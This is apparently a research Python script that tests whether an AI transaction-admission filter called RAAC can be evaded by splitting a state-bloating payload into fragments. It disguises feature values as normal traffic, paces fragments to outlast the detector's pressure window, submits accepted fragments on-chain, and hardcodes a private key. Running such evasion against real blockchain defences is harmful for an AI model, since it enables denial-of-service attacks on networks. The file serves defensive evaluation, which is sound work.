#!/usr/bin/env python3.11
"""
Fragmentation fuzz-loop — empirically measures whether splitting a
memory-intensive attack payload into k on-chain transactions evades RAAC
admission, replacing the paper's analytical "5-way split -> 400% base-gas
increase" claim with directly measured data (matching DETER2.0/MPFUZZ-style
empirical evasion testing rather than back-of-envelope calculation).

For each k in --k-values:
  - split the 96KB attack payload into k roughly-equal chunks
  - for each chunk, build a proportionally-scaled AI feature vector (a
    rational adversary shrinks gas_limit/opcode_count with the payload, not
    just bytecode_size) and query /predict
  - submit accepted fragments on-chain via sink(bytes), wait for receipts
  - report: accept rate, real total gasUsed (vs the k=1 baseline), and the
    paper's "base gas multiplier" (k x 21000 / 21000) for direct comparison

--drip-delay inserts a pause between fragments (e.g. > the 30s GC pressure
rolling window) to test whether pacing lets pressure decay back to baseline
between strikes, undermining detection via slow trickle instead of volume.

Usage:
  python3 fragmentation_fuzz.py --ai-url http://127.0.0.1:8000 \
      --k-values 1,2,3,4,5,6,8,10 --drip-delay 0 --out results_fast.json
  python3 fragmentation_fuzz.py --ai-url http://127.0.0.1:8000 \
      --k-values 5 --drip-delay 35 --out results_slowdrip.json
"""
import argparse
import json
import sys
import time
import urllib.request
import urllib.error

from web3 import Web3

TOTAL_BYTES        = 96_000
BASE_GAS_LIMIT      = 12_000_000
BASE_OPCODE_COUNT   = 40_000
GAS_PRICE           = 50   # camouflaged: matches NORMAL_FEATURES.gas_price
CALL_DEPTH          = 12
SSTORE_COUNT        = 0
PRIVATE_KEY         = "0x8f2a55949038a9610f502c24114d051185071191bc20b60811a2d7fba4513689"


def build_chunk_features(chunk_bytes, gas_estimate, tx_hash):
    scale = chunk_bytes / TOTAL_BYTES
    return {
        "tx_hash":       tx_hash,
        "gas_price":     GAS_PRICE,
        "gas_limit":     gas_estimate,
        "wei_value":     0,
        "bytecode_size": chunk_bytes,
        "opcode_count":  max(1, int(BASE_OPCODE_COUNT * scale)),
        "call_depth":    CALL_DEPTH,
        "sstore_count":  SSTORE_COUNT,
    }


def check_ai(ai_url, features):
    url = ai_url.rstrip("/") + "/predict"
    payload = json.dumps(features).encode()
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except Exception as exc:
        return {"action": "accept", "error": str(exc)}


def get_ai_status(ai_url):
    try:
        with urllib.request.urlopen(ai_url, timeout=3) as r:
            return json.loads(r.read())
    except Exception:
        return {}


def split_sizes(total_bytes, k):
    base = total_bytes // k
    sizes = [base] * k
    sizes[-1] += total_bytes - base * k  # remainder absorbed by last chunk
    return sizes


def run_k(w3, account, contract, ai_url, k, drip_delay, chain_id, nonce, log):
    sizes = split_sizes(TOTAL_BYTES, k)
    fragments = []
    for i, sz in enumerate(sizes):
        payload_bytes = b"\x00" * sz
        try:
            gas_est = contract.functions.sink(payload_bytes).estimate_gas({"from": account.address})
            gas_est = int(gas_est * 1.2)
        except Exception:
            gas_est = 8_000_000

        tx_hash_placeholder = f"0xfrag_k{k}_{i}"
        features = build_chunk_features(sz, gas_est, tx_hash_placeholder)
        ai_status = get_ai_status(ai_url)
        ai_resp = check_ai(ai_url, features)
        accepted = ai_resp.get("action") != "reject"

        entry = {
            "k": k, "fragment": i, "bytes": sz,
            "gas_limit_feature": gas_est,
            "anomaly_score": ai_resp.get("anomaly_score"),
            "ai_action": ai_resp.get("action"),
            "accepted": accepted,
            "gc_pressure_before": ai_status.get("gc_pressure"),
            "gas_used": 0,
            "tx_hash": None,
        }

        if accepted:
            tx = contract.functions.sink(payload_bytes).build_transaction({
                "from": account.address, "nonce": nonce,
                "gas": gas_est, "gasPrice": 0, "chainId": chain_id,
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            nonce += 1
            entry["tx_hash"] = tx_hash.hex()
            try:
                receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
                entry["gas_used"] = receipt.gasUsed
            except Exception as exc:
                entry["error"] = f"receipt_timeout: {exc}"

        fragments.append(entry)
        log(f"  k={k} frag={i}/{k-1} bytes={sz} gas_est={gas_est} "
            f"score={entry['anomaly_score']} action={entry['ai_action']} "
            f"gas_used={entry['gas_used']}")

        if drip_delay > 0 and i < len(sizes) - 1:
            time.sleep(drip_delay)

    return fragments, nonce


def main():
    ap = argparse.ArgumentParser(description="RAAC fragmentation evasion fuzz-loop")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8545)
    ap.add_argument("--ai-url", default="http://127.0.0.1:8000")
    ap.add_argument("--contract-address", required=True)
    ap.add_argument("--contract-abi", required=True, help="path to StateBloater.json artifact")
    ap.add_argument("--k-values", default="1,2,3,4,5,6,8,10")
    ap.add_argument("--drip-delay", type=float, default=0.0, help="seconds between fragments (0=fast)")
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    def log(msg):
        print(msg, flush=True)

    rpc_url = f"http://{args.host}:{args.port}"
    w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 30}))
    if not w3.is_connected():
        print(f"ERROR: cannot connect to {rpc_url}", file=sys.stderr)
        sys.exit(1)

    account = w3.eth.account.from_key(PRIVATE_KEY)
    chain_id = w3.eth.chain_id
    nonce = w3.eth.get_transaction_count(account.address, "pending")

    with open(args.contract_abi) as f:
        abi = json.load(f)["abi"]
    contract = w3.eth.contract(address=Web3.to_checksum_address(args.contract_address), abi=abi)

    k_values = [int(x) for x in args.k_values.split(",")]
    log(f"[fuzz] rpc={rpc_url} contract={args.contract_address} ai={args.ai_url} "
        f"k_values={k_values} drip_delay={args.drip_delay}s start_nonce={nonce}")

    all_results = {}
    for k in k_values:
        log(f"--- k={k} ---")
        fragments, nonce = run_k(w3, account, contract, args.ai_url, k, args.drip_delay, chain_id, nonce, log)
        accepted_n = sum(1 for f in fragments if f["accepted"])
        total_gas = sum(f["gas_used"] for f in fragments)
        all_results[str(k)] = {
            "fragments": fragments,
            "accepted_count": accepted_n,
            "total_fragments": k,
            "accept_rate": accepted_n / k,
            "total_gas_used": total_gas,
            "base_gas_multiplier": k,  # k x 21000 base-fee vs single k=1 tx (paper's existing metric)
        }
        log(f"  k={k} summary: accepted={accepted_n}/{k} total_gas_used={total_gas}")

    baseline_gas = all_results.get("1", {}).get("total_gas_used", 0)
    for k_str, r in all_results.items():
        r["real_gas_multiplier"] = (r["total_gas_used"] / baseline_gas) if baseline_gas else None

    with open(args.out, "w") as f:
        json.dump({
            "k_values": k_values,
            "drip_delay": args.drip_delay,
            "baseline_gas_used_k1": baseline_gas,
            "results": all_results,
        }, f, indent=2)
    log(f"[fuzz] wrote {args.out}")


if __name__ == "__main__":
    main()
